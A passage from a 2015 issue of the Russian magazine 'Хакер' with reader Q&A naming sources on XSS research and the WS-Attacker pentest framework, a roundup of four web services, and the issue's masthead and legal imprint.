        вания в любой корпоративной среде, будь то терминальные серверы 2
        или печать из другого филиала. Он не привязан к одному компьютеру,
        все его настройки переносятся вместе с ним, можно двигать хоть каж-
       дый день, главное, чтобы была сетевая розетка и электричество. Часто
         есть несколько типов картриджей, стандартных и с большим количе-
        ством тонера, что является плюсом. Также стоит отметить быструю пе-
         чать и большее количество настроек.


Q  Где можно узнать про новые интересные векторы XSS атак?
    К примеру, можно читать блоги рисерчеров — там часто попадаются на-
A  работки и отчеты об исследованиях. Стоит подписаться и на их твиттеры:
нередко можно встретить интересные векторы, которые умещаются в один
твит. И, конечно, специализированные ресурсы об XSS — например, xssposed.
Немаловажно, что в описании к каждому хаку там есть строка Vulnerable URL, по
которой можно узнать, как был атакован тот или иной сайт.

    Подкинь какой-нибудь интересный фреймворк для пентестов
Q  веб-сервисов!
     Легко! Взгляни на WS-Attacker — это модульный фрейморк, он написан на
A  Java и предназначен для проведения тестов на проникновения через
веб-сервисы. Он прост в использовании и в нем много интересных функций.
     ЭФЕМЕРНЫЙ ХОСТИНГ
           ephemeralp2p.durazo.us
1





         Сайты, которые существуют, только пока на них смотрят
                        Хостинг может работать прямо в браузере, благодаря тех-
        нологии WebSockets. По указанному адресу расположена стра-
        ница со скриптом. Скрипт позволяет ввести текст для нашего
        «сайта» и поделиться ссылкой на него — такое сообщение бу-
        дет существовать, покуда у кого-то открыта эта ссылка. Отсюда
       и название — «эфемерный пиринговый хостинг».
          Это явно не лучшая идея для сайта компании, но для быстрого
        распространения (и последующего уничтожения) ценной инфор-
       мации лучше не придумаешь.




      WHATISMYSCREENRESOLUTION
            whatismyscreenresolution.net
2





         Сервис для тестирования работы сайта при разном разрешении
                        Этот сервис не только дает ответ на поставленный в названии
        вопрос («Какое у меня разрешение экрана?») — этого было бы
        недостаточно полезно, чтобы добавлять его в закладки: он служит
       удобным инструментом для веб-разработчиков и позволяет по-
        смотреть, как сайт будет выглядеть на устройствах с разным раз-
       решением экрана. Сервис помнит все популярные разрешения, а
        загруженная через него страница показывается не как скриншот, а
        «живьем». Идеальный инструмент для тестирования интерактивных
        элементов.

     TUMBLR TV
            tumblr.com/tv
3





         Наркоманский аналог телевизора
                        Как известно, блоговая платформа Tumblr — это неиссякаемый
        источник картинок разной степени дурацкости, в том числе кузни-
        ца анимированных гифов всея интернета. Новый сервис Tumblr TV
        позволяет смотреть гифки так, будто это телевизор: они сменяют
        друг друга и никогда не заканчиваются.
          Предупреждаем: велик шанс зайти по указанной ссылке и на-
        долго залипнуть перед монитором! Может кончиться тем, что ты
       решишь повесить на стену старый планшет, включить на нем Tumblr
       TV и больше никогда не выключать.

      LINKMOJI
                       💩   .ws, 💩   .ws
4





         Генератор веселых ссылок
                        Создатели linkmoji решили воспользоваться возможностью
        включать символы Unicode в веб-адреса и создали сокращалку
        ссылок, которая превращает URL в набор эмодзи. Практического
       смысла в этом немного: перепечатывать значки намного сложнее,
       чем буквы, да и длина адресов выходит не меньше, чем у bitl.ly или
          goo.gl. Зато смотрится такая ссылка намного веселее, чем обыч-
         ная. Не забывай заходить на 🍵💩                🛀🐢🏀.🍕💩  .ws!
                                     16+





  № 08 (199)

                     Илья Русанен            Алексей Глазков
                       Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный         Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК

      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

         Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                         MEGANEWS

                  Мария Нефёдова           Анатолий Ализар
                   nefedova.maria@gameland.ru



                                 АРТ

        Елена Тихонова           Алик Вайнер              Анна Королькова
           Арт-директор               Дизайнер                    Верстальщик
                                     Обложка                 цифровой версии


                           РЕКЛАМА

                    Анна Яковлева         Мария Самсоненко
                       PR-менеджер            Менеджер по рекламе
                          yakovleva.a@glc.ru            samsonenko@glc.ru


                  РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                  Подробная информация по подписке shop.glc.ru, info@glc.ru
                                  Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111, Перм-
ский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массовых
коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2015